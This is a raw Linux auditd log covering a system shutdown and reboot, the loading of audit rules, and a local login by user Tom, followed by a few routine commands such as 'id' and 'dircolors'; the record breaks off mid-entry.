type=SERVICE_STOP msg=audit(1789396937.507:353): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.531:354): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.535:355): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789396937.543:356): prog-id=9 op=UNLOAD
type=SERVICE_STOP msg=audit(1789396937.627:357): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.635:358): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.651:359): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.707:360): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-binfmt comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.707:361): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.711:362): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.711:363): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.711:364): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-modules-load comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_SHUTDOWN msg=audit(1789396937.723:365): pid=1309 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396937.723:366): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=DAEMON_END msg=audit(1789396937.729:8175): op=terminate auid=0 uid=0 ses=4294967295 pid=1 subj=unconfined res=successAUID="root" UID="root"
type=DAEMON_START msg=audit(1789396946.555:3901): op=start ver=3.0.9 format=enriched kernel=6.1.0-49-amd64 auid=4294967295 pid=470 uid=0 ses=4294967295 subj=unconfined  res=successAUID="unset" UID="root"
type=SERVICE_START msg=audit(1789396946.599:13): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CONFIG_CHANGE msg=audit(1789396946.635:14): op=set audit_backlog_limit=8192 old=64 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789396946.635:14): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffecbeeb0c0 a2=3c a3=0 items=0 ppid=477 pid=512 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789396946.635:14): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789396946.635:15): op=set audit_failure=1 old=1 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789396946.635:15): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffecbeeb0c0 a2=3c a3=0 items=0 ppid=477 pid=512 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789396946.635:15): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789396946.643:16): op=set audit_backlog_wait_time=60000 old=15000 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789396946.643:16): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffecbeeb0c0 a2=3c a3=0 items=0 ppid=477 pid=512 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789396946.643:16): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789396946.643:17): auid=4294967295 ses=4294967295 subj=unconfined op=add_rule key="tom_exe" list=4 res=1AUID="unset"
type=SYSCALL msg=audit(1789396946.643:17): arch=c000003e syscall=44 success=yes exit=1064 a0=3 a1=7ffecbeeb180 a2=428 a3=0 items=0 ppid=477 pid=512 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789396946.643:17): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=SERVICE_START msg=audit(1789396946.647:18): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_BOOT msg=audit(1789396946.667:19): pid=534 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396946.675:20): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396946.699:21): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789396946.707:22): prog-id=9 op=LOAD
type=BPF msg=audit(1789396946.707:23): prog-id=10 op=LOAD
type=BPF msg=audit(1789396946.707:24): prog-id=11 op=LOAD
type=SERVICE_START msg=audit(1789396946.751:25): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396949.949:26): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396949.965:27): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396949.969:28): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396949.973:29): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396950.009:30): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396950.009:31): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396950.029:32): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_RUNLEVEL msg=audit(1789396950.061:33): pid=616 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='old-level=N new-level=5 comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789396950.065:34): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789396950.065:35): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789396967.837:36): pid=611 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789396967.837:37): pid=611 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789396967.837:38): pid=611 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=tty1 old-ses=4294967295 ses=1 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789396967.837:38): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7ffef90675c0 a2=4 a3=7ffef90672d4 items=0 ppid=1 pid=611 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="login" exe="/usr/bin/login" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789396967.837:38): proctitle=2F62696E2F6C6F67696E002D70002D2D
type=SERVICE_START msg=audit(1789396967.893:39): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789396967.897:40): pid=622 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789396967.897:41): pid=622 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789396967.897:42): pid=622 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=2 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789396967.897:42): arch=c000003e syscall=1 success=yes exit=4 a0=7 a1=7ffd11ac8da0 a2=4 a3=7ffd11ac8ab4 items=0 ppid=1 pid=622 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789396967.897:42): proctitle="(systemd)"
type=USER_START msg=audit(1789396967.901:43): pid=622 uid=0 auid=1000 ses=2 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789396967.901:44): arch=c000003e syscall=59 success=yes exit=0 a0=561cbc48fc70 a1=561cbc3812b0 a2=561cbc485440 a3=0 items=3 ppid=1 pid=622 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396967.901:44): argc=2 a0="/lib/systemd/systemd" a1="--user"
type=CWD msg=audit(1789396967.901:44): cwd="/"
type=PATH msg=audit(1789396967.901:44): item=0 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396967.901:44): item=1 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396967.901:44): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396967.901:44): proctitle="(systemd)"
type=SYSCALL msg=audit(1789396967.913:45): arch=c000003e syscall=59 success=yes exit=0 a0=557032acc070 a1=7ffde9866670 a2=7ffde9866f20 a3=0 items=3 ppid=624 pid=625 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="30-systemd-envi" exe="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396967.913:45): argc=1 a0="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=CWD msg=audit(1789396967.913:45): cwd="/"
type=PATH msg=audit(1789396967.913:45): item=0 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396967.913:45): item=1 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396967.913:45): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396967.913:45): proctitle="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=SYSCALL msg=audit(1789396967.921:46): arch=c000003e syscall=59 success=yes exit=0 a0=557032acfa90 a1=7ffde98666e0 a2=557032acfb30 a3=d9eb0b4fa614c713 items=3 ppid=626 pid=627 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemd-xdg-aut" exe="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396967.921:46): argc=4 a0="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" a1="/run/user/1000/systemd/generator" a2="/run/user/1000/systemd/generator.early" a3="/run/user/1000/systemd/generator.late"
type=CWD msg=audit(1789396967.921:46): cwd="/"
type=PATH msg=audit(1789396967.921:46): item=0 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396967.921:46): item=1 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396967.921:46): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396967.921:46): proctitle=2F7573722F6C69622F73797374656D642F757365722D67656E657261746F72732F73797374656D642D7864672D6175746F73746172742D67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E65726174
type=SYSCALL msg=audit(1789396968.017:47): arch=c000003e syscall=59 success=yes exit=0 a0=557032ad8b50 a1=557032acd220 a2=557032b06a90 a3=10 items=3 ppid=622 pid=628 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396968.017:47): argc=4 a0="/bin/systemctl" a1="--user" a2="set-environment" a3="DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus"
type=CWD msg=audit(1789396968.017:47): cwd="/home/Tom"
type=PATH msg=audit(1789396968.017:47): item=0 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.017:47): item=1 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.017:47): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396968.017:47): proctitle=2F62696E2F73797374656D63746C002D2D75736572007365742D656E7669726F6E6D656E7400444255535F53455353494F4E5F4255535F414444524553533D756E69783A706174683D2F72756E2F757365722F313030302F627573
type=SERVICE_START msg=audit(1789396968.029:48): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_START msg=audit(1789396968.037:49): pid=611 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=CRED_ACQ msg=audit(1789396968.037:50): pid=611 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=USER_LOGIN msg=audit(1789396968.037:51): pid=611 uid=0 auid=1000 ses=1 subj=unconfined msg='op=login acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789396968.037:52): arch=c000003e syscall=59 success=yes exit=0 a0=560f22145c70 a1=7ffef9067240 a2=560f22145db0 a3=0 items=3 ppid=611 pid=629 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="bash" exe="/usr/bin/bash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396968.037:52): argc=1 a0="-bash"
type=CWD msg=audit(1789396968.037:52): cwd="/home/Tom"
type=PATH msg=audit(1789396968.037:52): item=0 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.037:52): item=1 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.037:52): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396968.037:52): proctitle="-bash"
type=SYSCALL msg=audit(1789396968.041:53): arch=c000003e syscall=59 success=yes exit=0 a0=56026d318910 a1=56026d319450 a2=56026d316060 a3=8 items=3 ppid=629 pid=630 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="id" exe="/usr/bin/id" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396968.041:53): argc=2 a0="id" a1="-u"
type=CWD msg=audit(1789396968.041:53): cwd="/home/Tom"
type=PATH msg=audit(1789396968.041:53): item=0 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.041:53): item=1 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.041:53): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396968.041:53): proctitle=6964002D75
type=SYSCALL msg=audit(1789396968.069:54): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3e4e30 a1=56026d316800 a2=56026d319390 a3=0 items=3 ppid=629 pid=631 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="dircolors" exe="/usr/bin/dircolors" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396968.069:54): argc=2 a0="dircolors" a1="-b"
type=CWD msg=audit(1789396968.069:54): cwd="/home/Tom"
type=PATH msg=audit(1789396968.069:54): item=0 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.069:54): item=1 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396968.069:54): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396968.069:54): proctitle=646972636F6C6F7273002D62
type=SYSCALL msg=audit(1789396973.197:55): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3566f0 a1=56026d415f50 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=632 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789396973.197:55): argc=2 a0="ip" a1="google.com"
type=CWD msg=audit(1789396973.197:55): cwd="/home/Tom"
type=PATH msg=audit(1789396973.197:55): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396973.197:55): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
